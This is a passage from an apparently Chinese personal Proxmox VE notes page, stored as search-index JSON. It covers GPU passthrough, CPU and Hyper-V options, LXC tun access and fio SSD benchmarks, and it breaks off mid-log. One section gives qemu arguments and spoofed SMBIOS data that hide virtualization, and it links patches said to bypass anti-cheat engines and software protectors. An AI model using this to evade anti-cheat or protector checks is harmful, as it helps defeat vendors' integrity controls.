<p>\u89e3\u51b3\u65b9\u6cd5\u4e3ablacklist \u84dd\u7259\u9a71\u52a8</p> <pre><code>modprobe -r btusb\nmodprobe -r bluetooth\n</code></pre>","tags":["pve","\u865a\u62df\u5316"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2023/09/15/2023-09-15-PVE/#\u663e\u5361\u4e0d\u80fd\u8fde\u63a5\u591a\u663e\u793a\u5668","title":"\u663e\u5361\u4e0d\u80fd\u8fde\u63a5\u591a\u663e\u793a\u5668","text":"<p>nvidia \u63a7\u5236\u9762\u677f\u663e\u793a\u8be5\u663e\u5361\u53ea\u652f\u6301\u4e00\u4e2a\u663e\u793a\u5668\u3002</p> <p>\u53ef\u80fd\u7684\u89e3\u51b3\uff1a\u76f4\u901a\u663e\u5361\u65f6\u6dfb\u52a0\u4e86 rom \u6587\u4ef6</p>","tags":["pve","\u865a\u62df\u5316"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2023/09/15/2023-09-15-PVE/#\u53c2\u8003\u8d44\u6599","title":"\u53c2\u8003\u8d44\u6599","text":"<p>Appendix\u00a0G.\u00a0Configuring a Host for PCI Passthrough Red Hat Virtualization 4.1 | Red Hat Customer Portal --- \u9644\u5f55 G. \u4e3a PCI \u76f4\u901a\u914d\u7f6e\u4e3b\u673a \u7ea2\u5e3d\u865a\u62df\u5316 4.1 |\u7ea2\u5e3d\u5ba2\u6237\u95e8\u6237</p> <p>iommu=pt \u80fd\u591f\u63d0\u9ad8\u6027\u80fd If\u00a0<code>intel_iommu=on</code>\u00a0or\u00a0<code>amd_iommu=on</code>\u00a0works, you can try replacing them with\u00a0<code>iommu=pt</code>\u00a0or\u00a0<code>amd_iommu=pt</code>. The\u00a0<code>pt</code>\u00a0option only enables IOMMU for devices used in passthrough and will provide better host performance. However, the option may not be supported on all hardware. Revert to previous option if the\u00a0<code>pt</code>\u00a0option doesn't work for your host.</p> <p>allow_unsafe_interrupts \u9009\u9879 If the passthrough fails because the hardware does not support interrupt remapping, you can consider enabling the\u00a0<code>allow_unsafe_interrupts</code>\u00a0option if the virtual machines are trusted. The\u00a0<code>allow_unsafe_interrupts</code>\u00a0is not enabled by default because enabling it potentially exposes the host to MSI attacks from virtual machines. To enable the option:</p>","tags":["pve","\u865a\u62df\u5316"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2023/09/15/2023-09-15-PVE/#gentoo-wiki","title":"gentoo wiki","text":"<p>GPU passthrough with libvirt qemu kvm - Gentoo wiki</p>","tags":["pve","\u865a\u62df\u5316"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2023/09/15/2023-09-15-PVE/#redhat","title":"redhat","text":"<p>Product Documentation for Red Hat Virtualization 4.4 | Red Hat Customer Portal Red Hat Virtualization 4.4 Setting up an NVIDIA GPU for a virtual machine in Red Hat Virtualization</p>","tags":["pve","\u865a\u62df\u5316"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2023/09/15/2023-09-15-PVE/#qemu-\u53c2\u6570\u4e0e\u9690\u85cf\u865a\u62df\u5316","title":"qemu \u53c2\u6570\u4e0e\u9690\u85cf\u865a\u62df\u5316","text":"","tags":["pve","\u865a\u62df\u5316"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2023/09/15/2023-09-15-PVE/#\u53c2\u8003\u8d44\u6599_1","title":"\u53c2\u8003\u8d44\u6599","text":"<ul> <li>\u65b9\u6cd51 \u8bbe\u7f6e qemu \u53c2\u6570\u9690\u85cf\uff1aUsing VRChat in a Virtual Machine     - \u542f\u7528 <code>hypervisor=on</code> \u7684\u60c5\u51b5\u4e0b\u7684\u7ed5\u8fc7     - \u4ecb\u7ecd\u4e86\u4e00\u4e2a\u4e2a\u542f\u7528 <code>hv-foo</code> \u548c\u4f7f\u7528 <code>hv-passthrough=on</code> \u7684\u533a\u522b     - \u6709\u5173\u4e8e qemu SMBIOS \u8bbe\u7f6e\u7684\u4ecb\u7ecd\u548c\u811a\u672c</li> <li>\u65b9\u6cd52 \u4fee\u6539 qemu \u6e90\u7801\uff1azhaodice/proxmox-ve-anti-detection: A patch to hide PVE itself</li> <li>\u662f\u5426\u53ef\u4ee5\u5728 VM \u4e2d\u518d\u8fd0\u884c WSL2 \u865a\u62df\u673a\uff1f     - WLS2 on Win11 VM\u300225% slower\u3002Windows 11 with Hyper-V on Proxmox - onemarcfifty</li> </ul>","tags":["pve","\u865a\u62df\u5316"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2023/09/15/2023-09-15-PVE/#qemu-\u53c2\u6570\u7814\u7a76","title":"qemu \u53c2\u6570\u7814\u7a76","text":"<p>\u4f7f\u7528\u5982\u4e0b\u547d\u4ee4\u53ef\u4ee5\u67e5\u770b pve \u8fd0\u884c\u865a\u62df\u673a\u7684 qemu \u547d\u4ee4 <pre><code>qm showcmd vmid\n</code></pre></p> <p>\u539f\u6765x86-64-v3\uff0c\u5df2\u7ecf\u5e26\u4e86\u8fd9\u4e9b\u53c2\u6570\u4e86 <pre><code>-cpu 'qemu64,+abm,+aes,+avx,+avx2,+bmi1,+bmi2,enforce,+f16c,+fma,hv_ipi,hv_relaxed,hv_reset,hv_runtime,hv_spinlocks=0x1fff,hv_stimer,hv_synic,hv_time,hv_vapic,hv_vpindex,+kvm_pv_eoi,+kvm_pv_unhalt,+movbe,+pni,+popcnt,+sse4.1,+sse4.2,+ssse3,+xsave'\n</code></pre></p>","tags":["pve","\u865a\u62df\u5316"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2023/09/15/2023-09-15-PVE/#cpu-type","title":"cpu type","text":"<p>QEMU / KVM CPU model configuration \u2014 QEMU documentation</p> <ul> <li>\u4e24\u79cd CPU \u65b9\u6cd5\uff1a     - host passthrough\uff1a\u65e0\u6cd5 live \u8fc1\u79fb     - named model</li> </ul> <p>QEMU comes with a number of predefined named CPU models, that typically refer to specific generations of hardware released by Intel and AMD. These allow the guest VMs to have a degree of isolation from the host CPU, allowing greater flexibility in live migrating between hosts with differing hardware.</p> <p>\u5728\u4e24\u79cd\u60c5\u51b5\u4e0b\uff0c\u90fd\u53ef\u4ee5\u542f\u7528\u6216\u8005\u7981\u7528\u4e00\u4e9b\u7279\u6027</p> <p>In both cases, it is possible to optionally add or remove individual CPU features, to alter what is presented to the guest by default.</p> <p>x86-64 \u517c\u5bb9\u7b49\u7ea7\uff0c\u4f20\u7edf\u7684\u64cd\u4f5c\u7cfb\u7edf\u548c\u5de5\u5177\u94fe\u91c7\u7528\u9ed8\u8ba4\u7684\u7b49\u7ea7\uff08x86-64-v1\uff09\uff0c\u4f46\u662f\u672a\u6765\u7684\u8f6f\u4ef6\u53ef\u80fd\u91c7\u7528\u66f4\u9ad8\u7684\u7b49\u7ea7\u3002</p> <p>Traditionally most operating systems and toolchains would only target the original baseline ABI. It is expected that in future OS and toolchains are likely to target newer ABIs.</p> <p>x86 psABIs / x86-64 psABI \u00b7 GitLab</p>","tags":["pve","\u865a\u62df\u5316"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2023/09/15/2023-09-15-PVE/#hyper-v-enlightenments","title":"Hyper-V Enlightenments","text":"<p>Hyper-V Enlightenments: Hyper-V Enlightenments \u2014 QEMU documentation</p> <ul> <li>\u63d0\u793a windows \u64cd\u4f5c\u7cfb\u7edf\u52a0\u901f\u67d0\u4e9b\u7279\u6027\uff0c\u7c7b\u4f3c\u4e8e\u4e00\u79cd\u534a\u865a\u62df\u5316\u3002</li> </ul> <p>In some cases when implementing a hardware interface in software is slow, KVM implements its own paravirtualized interfaces. This works well for Linux as guest support for such features is added simultaneously with the feature itself. It may, however, be hard-to-impossible to add support for these interfaces to proprietary OSes, namely, Microsoft Windows. KVM on x86 implements Hyper-V Enlightenments for Windows guests. These features make Windows and Hyper-V guests think they\u2019re running on top of a Hyper-V compatible hypervisor and use Hyper-V specific features.</p>","tags":["pve","\u865a\u62df\u5316"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2023/09/15/2023-09-15-PVE/#\u8ba9-windows-\u4efb\u52a1\u7ba1\u7406\u5668\u4e0d\u663e\u793a\u865a\u62df\u673a\u6700\u5c0f\u914d\u7f6e","title":"\u8ba9 windows \u4efb\u52a1\u7ba1\u7406\u5668\u4e0d\u663e\u793a\u865a\u62df\u673a\u6700\u5c0f\u914d\u7f6e","text":"<ul> <li><code>cpu: host,hidden=1</code>\uff1apve CPU \u7c7b\u578b\u52a0\u4e0a hidden \u4e0d\u884c</li> <li><code>-cpu kvm=off</code>\uff1a\u4e0d\u884c     - <code>kvm=off</code> \uff1akvm=off don't touch kvm acceleration, just changes visibility of KVM to guests.</li> </ul> <p>\u6210\u529f\u8ba9\u4efb\u52a1\u7ba1\u7406\u5668\u663e\u793a\u975e\u865a\u62df\u673a</p> <pre><code>args: -cpu 'host,-hypervisor,kvm=off,+kvm_pv_unhalt,+kvm_pv_eoi,hv_spinlocks=0x1fff,hv_vapic,hv_time,hv_reset,hv_vpindex,hv_runtime,hv_relaxed,hv_vendor_id=intel'\n</code></pre> <p><code>hv_vendor_id</code>  \u53ef\u4ee5\u968f\u4fbf\u586b\u3002\u5e76\u4e0d\u662f\u8868\u793aintel CPU\u7684\u610f\u601d\u3002</p> <p></p> <p>\u662f\u5426\u4ec5\u9700\uff08\u5f85\u6d4b\u8bd5\uff09\uff1a<code>args: -cpu host,-hypervisor,hv_vendor_id=amd</code></p>","tags":["pve","\u865a\u62df\u5316"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2023/09/15/2023-09-15-PVE/#\u8c03\u8282-qemu--cpu-\u53c2\u6570","title":"\u8c03\u8282 qemu -cpu \u53c2\u6570","text":"<p>VRChat \u865a\u62df\u673a\u8fd0\u884c\uff08\u5c45\u7136\u662f\u5b98\u65b9\u6587\u6863\uff09\uff1aUsing VRChat in a Virtual Machine</p> <ul> <li>\u8bbe\u7f6e1 <pre><code>-cpu 'host,migratable=off,hypervisor=on,topoext=on,hv_relaxed,hv_reset,hv_runtime,hv_stimer,hv_synic,hv_time,hv_vapic,hv_vpindex,hv-frequencies,hv-avic,hv-vendor-id=0123456789AB,host-cache-info=on,apic=on,invtsc=on'\n</code></pre></li> <li>\u8bbe\u7f6e2     - \u8fd9\u4e2a\u65b9\u6848\u542f\u7528\u4e86 hv-passthrogth\uff0c\u662f\u4e0d\u63a8\u8350\u7684\u3002\u4f1a\u542f\u7528\u6240\u6709 KVM \u652f\u6301\u7684 Hyper-V entitlments\uff0c\u53ef\u80fd\u786c\u4ef6\u4e0d\u652f\u6301\u4e00\u4e9b\u9009\u9879 <pre><code>-cpu host,migratable=off,hypervisor=on,invtsc=on,hv-time=on,hv-passthrough=on\n</code></pre></li> <li>\u8bbe\u7f6e3     - \u589e\u52a0\u4e00\u4e9b <code>-smbios type=#,...</code>\uff0c\u4f7f\u5f97\u770b\u5f97\u66f4\u50cf\u771f\u5b9e\u786c\u4ef6\u3002     - \u83b7\u53d6\u811a\u672c\uff1ahttps://gist.github.com/kiler129/5d437a37c07ac6eb1cdf0e595e488fd2</li> </ul> <p>\u8bbe\u7f6e1 +\u8bbe\u7f6e3 \u53ef\u7528\u914d\u7f6e <pre><code>args: -cpu 'host,kvm=off,migratable=off,hypervisor=on,topoext=on,hv_relaxed,hv_reset,hv_runtime,hv_stimer,hv_synic,hv_time,hv_vapic,hv_vpindex,hv-frequencies,hv-avic,hv-vendor-id=0123456789AB,host-cache-info=on,apic=on,invtsc=on' -smbios 'type=0,version=2803,vendor=American Megatrends Inc.,uefi=on,release=5.17,date=04/27/2022' -smbios 'type=1,version=System Version,sku=SKU,product=System Product Name,manufacturer=ASUS,uuid=1eb6d23f-6e89-a8c6-1bca-7c10c9a253d8,serial=System Serial Number,family=To be filled by O.E.M.' -smbios 'type=2,asset=Default string,version=Rev X.0x,product=TUF GAMING B550M-PLUS (WI-FI),location=Default string,manufacturer=ASUSTeK COMPUTER INC.,serial=210686671502915' -smbios 'type=3,asset=Default string,version=Default string,sku=Default string,manufacturer=Default string,serial=Default string' -smbios 'type=4,asset=Unknown,version=AMD Ryzen 7 5800X 8-Core Processor             ,part=Zen,manufacturer=Advanced Micro Devices,, Inc.,serial=Unknown,sock_pfx=AM4' -smbios 'type=11,value=Default string' -smbios 'type=17,bank=Bank 0,asset=Not Specified,part=YPT4U2666D19161C,manufacturer=GLOWAY,speed=3200,serial=31EEBDB8,loc_pfx=DIMM 0'\nballoon: 0\nbios: ovmf\nboot: order=scsi0;sata0\ncores: 16\ncpu: host,hidden=1\n</code></pre></p>","tags":["pve","\u865a\u62df\u5316"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2023/09/15/2023-09-15-PVE/#\u6e38\u620f\u4f8b\u5b50","title":"\u6e38\u620f\u4f8b\u5b50","text":"<ul> <li>EasyAntiCheat\uff08EAC\uff09     - VRChat     - \u539f\u795e</li> <li>\u817e\u8baf ACE     - \u5373\u4f7f windows \u4e0d\u663e\u793a\u865a\u62df\u673a\u4e86\uff0c\u4ecd\u7136\u53cd\u4f5c\u5f0a\u62a5\u9519\u3002\u5bc4\uff0c\u7f51\u4e0a\u627e\u4e0d\u5230\u89e3\u51b3\u529e\u6cd5</li> </ul>","tags":["pve","\u865a\u62df\u5316"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2023/09/15/2023-09-15-PVE/#pve-anti-cheat-\u9879\u76ee","title":"pve-anti-cheat \u9879\u76ee","text":"<p>zhaodice/proxmox-ve-anti-detection: A patch to hide PVE itself zhaodice/qemu-anti-detection: A patch to hide qemu itself, bypass mhyprot,EAC,nProtect / VMProtect,VProtect, Themida, Enigma Protector,Safegine Shielden \u539f\u7406\uff1a\u66f4\u6539 qemu \u5b57\u7b26\u4e32\uff0c\u4f2a\u88c5\u6210\u771f\u5b9e\u786c\u4ef6\u578b\u53f7</p> <p>\u76ee\u524d\u652f\u6301\u7684\u53cd\u4f5c\u5f0a</p> Type Engine Bypass AntiCheat Anti Cheat Expert (ACE) \u2611\ufe0f AntiCheat Easy Anti Cheat (EAC) \u2611\ufe0f AntiCheat Gepard Shield \u2611\ufe0f (Needs patched kernel on host:\u00a0https://github.com/WCharacter/RDTSC-KVM-Handler\u00a0) AntiCheat Mhyprot \u2611\ufe0f AntiCheat nProtect GameGuard (NP) \u2611\ufe0f AntiCheat Roblox \u2611\ufe0f May work with Hyper-V in the guest:\u00a0#56 AntiCheat Vanguard \u203c\ufe0f(1: Incorrect function) Encrypt Enigma Protector \u2611\ufe0f Encrypt Safegine Shielden \u2611\ufe0f Encrypt Themida \u2611\ufe0f Encrypt VMProtect \u2611\ufe0f Encrypt VProtect \u2611\ufe0f <p>\u539f\u7248\u4e0d\u66f4\u65b0\u4e86\uff0c\u652f\u6301\u7248\u672c\u6709\u9650\uff0cfork \u7248\u672c lixiaoliu666/pve-anti-detection: PVE virtual machine emulates a physical machine to avoid(or anti) detection\uff08pve\u865a\u62df\u673a\u6a21\u62df\u771f\u5b9e\u673a\u5668\u9632\u68c0\u6d4b\uff09</p> <ul> <li>action \u81ea\u52a8\u7f16\u8bd1\u6700\u65b0 pve qemu \u7248\u672c</li> <li>\u5b89\u88c5 deb \u5373\u53ef\uff0c\u4e0d\u9700\u8981\u81ea\u5df1\u624b\u52a8\u7f16\u8bd1</li> </ul> <p>PVE 8.2.7\uff0c\u4ec5\u624b\u52a8\u5b89\u88c5 pve-qemu-kvm_9.2.0-2_amd64.deb \u4e86\uff0cwin11 \u865a\u62df\u673a\u751a\u81f3\u6ca1\u91cd\u542f\uff0c\u5c45\u7136\u5df2\u7ecf\u751f\u6548\u4e86\u3002</p> <p>cpu \u8bbe\u7f6e\u4e3a x86-v3 \u7684\u60c5\u51b5\u4e0b\uff0c\u53ef\u4ee5\u542f\u52a8 VRChat \u548c ACE \u8f6f\u4ef6\u3002</p>","tags":["pve","\u865a\u62df\u5316"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2023/09/15/2023-09-15-PVE/#\u5176\u5b83\u95ee\u9898","title":"\u5176\u5b83\u95ee\u9898","text":"","tags":["pve","\u865a\u62df\u5316"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2023/09/15/2023-09-15-PVE/#\u4fee\u6539-hostname-\u5bc4","title":"\u4fee\u6539 hostname \u5bc4","text":"<p>Fix Proxmox Error after hostname/ip change (web-wilke.de) \u4fee\u6539\u4e86 hostname \u540e\uff0c\u5bb9\u5668\u865a\u62df\u673a\u90fd\u770b\u4e0d\u89c1\u4e86\u3002\u5c1d\u8bd5\u4fee\u6539/etc/hosts \u4f46\u662f\u4e0d\u591f\uff0c\u6700\u540e\u6ca1\u5f04\u597d\uff0c\u8fd8\u662f\u6539\u56de\u539f\u6765\u7684 hostname \u4e86\u3002</p>","tags":["pve","\u865a\u62df\u5316"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2023/09/15/2023-09-15-PVE/#\u5907\u4efd\u5355\u4e2a-disk","title":"\u5907\u4efd\u5355\u4e2a disk","text":"<p>zfs \u81ea\u5df1\u5907\u4efd\u53ef\u4ee5\u5417\uff1f \u6211\u521b\u5efa\u7684 VM \u4e0d\u77e5\u4e3a\u4f55\u4e0d\u652f\u6301\u5feb\u7167\u3002</p> <p>backup single disk in VM | Proxmox Support Forum</p>","tags":["pve","\u865a\u62df\u5316"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2023/09/15/2023-09-15-PVE/#zerotier-\u65e0\u6cd5\u542f\u52a8","title":"zerotier \u65e0\u6cd5\u542f\u52a8","text":"<p>OpenVPN in LXC - Proxmox VE</p> <p>\u7279\u6743\u5bb9\u5668\u6216\u6dfb\u52a0\u6743\u9650</p> <pre><code>vim /etc/pve/lxc/100.conf\n\n...\nonboot: 1\nostype: unmanaged\nparent: basic\nrootfs: local-zfs:subvol-100-disk-0,size=100G\nswap: 0\nunprivileged: 1\nlxc.cgroup2.devices.allow: c 10:200 rwm\nlxc.mount.entry: /dev/net dev/net none bind,create=dir\n\n[basic]\n#%E5%9F%BA%E6%9C%AC%E9%98%B2%E7%81%AB%E5%A2%99%EF%BC%8Cddns%EF%BC%8Cwg_s2s%E5%8F%AF%E4%BB%A5%E8%BF%9E%E6%8E%A5op1,op3\narch: amd64\ncores: 2\nhostname: op2\n</code></pre> <pre><code>chown 100000:100000 /dev/net/tun\n</code></pre>","tags":["pve","\u865a\u62df\u5316"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2023/09/15/2023-09-15-PVE/#\u78c1\u76d8\u6d4b\u901f","title":"\u78c1\u76d8\u6d4b\u901f","text":"<p>ryzen \u865a\u62df\u673a</p>","tags":["pve","\u865a\u62df\u5316"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2023/09/15/2023-09-15-PVE/#pcie40-\u7231\u56fd\u8005-2t","title":"pcie4.0 \u7231\u56fd\u8005 2T","text":"<pre><code>\u279c  fio sudo fio --filename=test.bin ssd-win-likely.fio\nseq-read-4m: (g=0): rw=read, bs=(R) 4096KiB-4096KiB, (W) 4096KiB-4096KiB, (T) 4096KiB-4096KiB, ioengine=libaio, iodepth=32\nseq-write-4m: (g=1): rw=write, bs=(R) 4096KiB-4096KiB, (W) 4096KiB-4096KiB, (T) 4096KiB-4096KiB, ioengine=libaio, iodepth=32\nrand-read-4k: (g=2): rw=randread, bs=(R) 4096B-4096B, (W) 4096B-4096B, (T) 4096B-4096B, ioengine=libaio, iodepth=4\nrand-write-4k: (g=3): rw=randwrite, bs=(R) 4096B-4096B, (W) 4096B-4096B, (T) 4096B-4096B, ioengine=libaio, iodepth=4\nfio-3.28\nStarting 4 processes\nseq-read-4m: Laying out IO file (1 file / 10240MiB)\nJobs: 1 (f=1): [_(3),w(1)][68.5%][w=80.5MiB/s][w=20.6k IOPS][eta 01m:10s]\nseq-read-4m: (groupid=0, jobs=1): err= 0: pid=778450: Fri Sep 29 23:47:57 2023\n  read: IOPS=556, BW=2226MiB/s (2334MB/s)(10.0GiB/4600msec)\n    slat (usec): min=47, max=7932, avg=478.16, stdev=665.62\n    clat (msec): min=8, max=162, avg=56.62, stdev=22.04\n     lat (msec): min=8, max=162, avg=57.10, stdev=21.94\n    clat percentiles (msec):\n     |  1.00th=[   15],  5.00th=[   23], 10.00th=[   28], 20.00th=[   36],\n     | 30.00th=[   44], 40.00th=[   51], 50.00th=[   59], 60.00th=[   64],\n     | 70.00th=[   69], 80.00th=[   74], 90.00th=[   82], 95.00th=[   91],\n     | 99.00th=[  131], 99.50th=[  142], 99.90th=[  159], 99.95th=[  161],\n     | 99.99th=[  163]\n   bw (  MiB/s): min= 1993, max= 2336, per=99.89%, avg=2223.66, stdev=118.21, samples=8\n   iops        : min=  498, max=  584, avg=555.63, stdev=29.56, samples=8\n  lat (msec)   : 10=0.08%, 20=3.01%, 50=36.45%, 100=58.32%, 250=2.15%\n  cpu          : usr=0.89%, sys=25.74%, ctx=2221, majf=1, minf=32780\n  IO depths    : 1=0.1%, 2=0.1%, 4=0.2%, 8=0.3%, 16=0.6%, 32=98.8%, &gt;=64=0.0%\n     submit    : 0=0.0%, 4=100.0%, 8=0.0%, 16=0.0%, 32=0.0%, 64=0.0%, &gt;=64=0.0%\n     complete  : 0=0.0%, 4=100.0%, 8=0.0%, 16=0.0%, 32=0.1%, 64=0.0%, &gt;=64=0.0%\n     issued rwts: total=2560,0,0,0 short=0,0,0,0 dropped=0,0,0,0\n     latency   : target=0, window=0, percentile=100.00%, depth=32\nseq-write-4m: (groupid=1, jobs=1): err= 0: pid=778524: Fri Sep 29 23:47:57 2023\n  write: IOPS=82, BW=330MiB/s (346MB/s)(10.0GiB/31034msec); 0 zone resets\n    slat (usec): min=76, max=221964, avg=1061.67, stdev=5512.31\n    clat (msec): min=4, max=7483, avg=385.10, stdev=1126.37\n     lat (msec): min=5, max=7484, avg=386.16, stdev=1126.51\n    clat percentiles (msec):\n     |  1.00th=[   12],  5.00th=[   22], 10.00th=[   27], 20.00th=[   34],\n     | 30.00th=[   43], 40.00th=[   52], 50.00th=[   64], 60.00th=[   74],\n     | 70.00th=[   96], 80.00th=[  142], 90.00th=[  502], 95.00th=[ 2970],\n     | 99.00th=[ 5604], 99.50th=[ 5604], 99.90th=[ 7483], 99.95th=[ 7483],\n     | 99.99th=[ 7483]\n   bw (  KiB/s): min=65667, max=2682078, per=100.00%, avg=823187.87, stdev=652362.03, samples=24\n   iops        : min=   16, max=  654, avg=200.58, stdev=159.18, samples=24\n  lat (msec)   : 10=0.82%, 20=2.77%, 50=34.80%, 100=32.73%, 250=15.51%\n  lat (msec)   : 500=3.20%, 750=1.64%, 1000=0.55%, 2000=1.41%, &gt;=2000=6.56%\n  cpu          : usr=3.45%, sys=5.12%, ctx=1899, majf=0, minf=15\n  IO depths    : 1=0.1%, 2=0.1%, 4=0.2%, 8=0.3%, 16=0.6%, 32=98.8%, &gt;=64=0.0%\n     submit    : 0=0.0%, 4=100.0%, 8=0.0%, 16=0.0%, 32=0.0%, 64=0.0%, &gt;=64=0.0%\n     complete  : 0=0.0%, 4=100.0%, 8=0.0%, 16=0.0%, 32=0.1%, 64=0.0%, &gt;=64=0.0%\n     issued rwts: total=0,2560,0,0 short=0,0,0,0 dropped=0,0,0,0\n     latency   : target=0, window=0, percentile=100.00%, depth=32\nrand-read-4k: (groupid=2, jobs=1): err= 0: pid=778956: Fri Sep 29 23:47:57 2023\n  read: IOPS=50.4k, BW=197MiB/s (207MB/s)(10.0GiB/51982msec)\n    slat (nsec): min=1170, max=3868.5k, avg=4517.95, stdev=7664.76\n    clat (nsec): min=220, max=1695.1M, avg=74038.40, stdev=2120026.59\n     lat (usec): min=12, max=1695.1k, avg=78.64, stdev=2120.05\n    clat percentiles (usec):\n     |  1.00th=[   18],  5.00th=[   21], 10.00th=[   23], 20.00th=[   26],\n     | 30.00th=[   33], 40.00th=[   76], 50.00th=[   81], 60.00th=[   84],\n     | 70.00th=[   88], 80.00th=[   93], 90.00th=[  105], 95.00th=[  123],\n     | 99.00th=[  210], 99.50th=[  293], 99.90th=[  627], 99.95th=[ 1074],\n     | 99.99th=[ 1975]\n   bw (  KiB/s): min= 5643, max=270960, per=100.00%, avg=205429.51, stdev=34312.15, samples=101\n   iops        : min= 1410, max=67740, avg=51357.30, stdev=8578.07, samples=101\n  lat (nsec)   : 250=0.01%, 500=0.01%, 750=0.01%, 1000=0.01%\n  lat (usec)   : 2=0.01%, 10=0.01%, 20=4.52%, 50=32.03%, 100=50.56%\n  lat (usec)   : 250=12.11%, 500=0.62%, 750=0.08%, 1000=0.02%\n  lat (msec)   : 2=0.05%, 4=0.01%, 10=0.01%, 20=0.01%, 50=0.01%\n  lat (msec)   : 500=0.01%, 2000=0.01%\n  cpu          : usr=7.47%, sys=29.84%, ctx=1440214, majf=0, minf=21\n  IO depths    : 1=0.1%, 2=0.1%, 4=100.0%, 8=0.0%, 16=0.0%, 32=0.0%, &gt;=64=0.0%\n     submit    : 0=0.0%, 4=100.0%, 8=0.0%, 16=0.0%, 32=0.0%, 64=0.0%, &gt;=64=0.0%\n     complete  : 0=0.0%, 4=100.0%, 8=0.0%, 16=0.0%, 32=0.0%, 64=0.0%, &gt;=64=0.0%\n     issued rwts: total=2621440,0,0,0 short=0,0,0,0 dropped=0,0,0,0\n     latency   : target=0, window=0, percentile=100.00%, depth=4\nrand-write-4k: (groupid=3, jobs=1): err= 0: pid=779798: Fri Sep 29 23:47:57 2023\n  write: IOPS=20.3k, BW=79.1MiB/s (83.0MB/s)(4748MiB/60005msec); 0 zone resets\n    slat (nsec): min=1270, max=418621k, avg=6166.83, stdev=381021.38\n    clat (nsec): min=290, max=1815.5M, avg=190356.30, stdev=6618668.74\n     lat (usec): min=16, max=1815.5k, avg=196.62, stdev=6629.88\n    clat percentiles (usec):\n     |  1.00th=[   21],  5.00th=[   26], 10.00th=[   30], 20.00th=[   52],\n     | 30.00th=[   83], 40.00th=[   87], 50.00th=[   91], 60.00th=[   95],\n     | 70.00th=[  102], 80.00th=[  120], 90.00th=[  188], 95.00th=[  318],\n     | 99.00th=[ 1844], 99.50th=[ 2008], 99.90th=[ 4424], 99.95th=[ 7635],\n     | 99.99th=[20579]\n   bw (  KiB/s): min= 1920, max=185240, per=100.00%, avg=88600.73, stdev=62711.61, samples=108\n   iops        : min=  480, max=46310, avg=22150.14, stdev=15677.91, samples=108\n  lat (nsec)   : 500=0.01%, 750=0.01%, 1000=0.01%\n  lat (usec)   : 2=0.01%, 4=0.01%, 10=0.01%, 20=0.63%, 50=19.19%\n  lat (usec)   : 100=47.74%, 250=25.71%, 500=3.06%, 750=0.44%, 1000=0.25%\n  lat (msec)   : 2=2.46%, 4=0.39%, 10=0.08%, 20=0.02%, 50=0.01%\n  lat (msec)   : 100=0.01%, 500=0.01%, 750=0.01%, 1000=0.01%, 2000=0.01%\n  cpu          : usr=2.85%, sys=12.76%, ctx=889109, majf=0, minf=17\n  IO depths    : 1=0.1%, 2=0.1%, 4=100.0%, 8=0.0%, 16=0.0%, 32=0.0%, &gt;=64=0.0%\n     submit    : 0=0.0%, 4=100.0%, 8=0.0%, 16=0.0%, 32=0.0%, 64=0.0%, &gt;=64=0.0%\n     complete  : 0=0.0%, 4=100.0%, 8=0.0%, 16=0.0%, 32=0.0%, 64=0.0%, &gt;=64=0.0%\n     issued rwts: total=0,1215500,0,0 short=0,0,0,0 dropped=0,0,0,0\n     latency   : target=0, window=0, percentile=100.00%, depth=4\n\nRun status group 0 (all jobs):\n   READ: bw=2226MiB/s (2334MB/s), 2226MiB/s-2226MiB/s (2334MB/s-2334MB/s), io=10.0GiB (10.7GB), run=4600-4600msec\n\nRun status group 1 (all jobs):\n  WRITE: bw=330MiB/s (346MB/s), 330MiB/s-330MiB/s (346MB/s-346MB/s), io=10.0GiB (10.7GB), run=31034-31034msec\n\nRun status group 2 (all jobs):\n   READ: bw=197MiB/s (207MB/s), 197MiB/s-197MiB/s (207MB/s-207MB/s), io=10.0GiB (10.7GB), run=51982-51982msec\n\nRun status group 3 (all jobs):\n  WRITE: bw=79.1MiB/s (83.0MB/s), 79.1MiB/s-79.1MiB/s (83.0MB/s-83.0MB/s), io=4748MiB (4979MB), run=60005-60005msec\n\nDisk stats (read/write):\n  sdb: ios=2641793/1235910, merge=38/87, ticks=1077282/5674545, in_queue=6778554, util=94.90%\n</code></pre>","tags":["pve","\u865a\u62df\u5316"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2023/09/15/2023-09-15-PVE/#\u4e09\u661f-981at","title":"\u4e09\u661f 981at","text":"<pre><code>\u279c  fio sudo fio --directory=/root/ --filename=test.bin ssd-win-likely.fio\nseq-read-4m: (g=0): rw=read, bs=(R) 4096KiB-4096KiB, (W) 4096KiB-4096KiB, (T) 4096KiB-4096KiB, ioengine=libaio, iodepth=32\nseq-write-4m: (g=1): rw=write, bs=(R) 4096KiB-4096KiB, (W) 4096KiB-4096KiB, (T) 4096KiB-4096KiB, ioengine=libaio, iodepth=32\nrand-read-4k: (g=2): rw=randread, bs=(R) 4096B-4096B, (W) 4096B-4096B, (T) 4096B-4096B, ioengine=libaio, iodepth=4\nrand-write-4k: (g=3): rw=randwrite, bs=(R) 4096B-4096B, (W) 4096B-4096B, (T) 